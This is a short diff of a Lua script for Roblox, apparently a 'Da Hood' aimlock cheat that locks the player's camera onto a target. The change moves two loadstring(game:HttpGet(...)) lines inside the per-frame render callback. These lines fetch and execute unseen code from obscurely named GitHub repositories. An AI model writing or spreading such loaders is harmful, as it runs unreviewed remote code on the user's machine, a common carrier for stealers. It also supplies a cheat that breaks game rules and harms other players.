@@ -56,10 +56,12 @@ RunService:BindToRenderStep("AimLock", 0, function()
         local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
 
         CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
-    end
-    end)
+
 
 local Players = game:GetService("Players")
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/pas'))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/bll/main/black'))()
+
+    end
+    end)
